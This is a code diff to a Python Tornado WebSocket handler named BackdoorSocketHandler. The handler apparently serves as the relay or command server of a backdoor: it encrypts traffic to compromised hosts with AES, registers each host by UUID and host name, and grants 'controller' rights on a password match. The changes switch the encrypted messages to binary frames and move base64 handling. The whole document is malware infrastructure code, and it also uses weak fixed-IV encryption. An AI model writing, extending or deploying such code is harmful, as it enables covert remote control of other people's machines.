@@ -39,11 +39,11 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
         ciphertext = encryptor.encrypt(text)
-        return b64encode(ciphertext)
+        return ciphertext
 
     def decrypt(self, ciphertext):
         decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
-        plain = decryptor.decrypt(b64decode(ciphertext))
+        plain = decryptor.decrypt(ciphertext)
         return plain
 
     def open(self):
@@ -54,13 +54,13 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
             self.clients.pop(self.ID)
 
     def send_data(self, data):
-        self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})))
+        self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})), True)
 
     def send_end(self):
-        self.write_message(self.encrypt(json.dumps({'end': 'true'})))
+        self.write_message(self.encrypt(json.dumps({'end': 'true'})), True)
 
     def send_json(self, jsonobj):
-        self.write_message(self.encrypt(json.dumps(jsonobj)))
+        self.write_message(self.encrypt(json.dumps(jsonobj)), True)
 
     def on_message(self, message):
         if self.UUID is not None and self.SECRET is not None:
@@ -128,7 +128,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 self.HOST_NAME = msg['host_name']
                 self.SECRET = b64decode(msg['secret'])
                 if 'pwd' in msg:
-                    if PASSWORD == self.decrypt(msg['pwd']):
+                    if PASSWORD == self.decrypt(b64decode(msg['pwd'])):
                         self.is_controller = True
                         self.send_data('login success')
                     else:
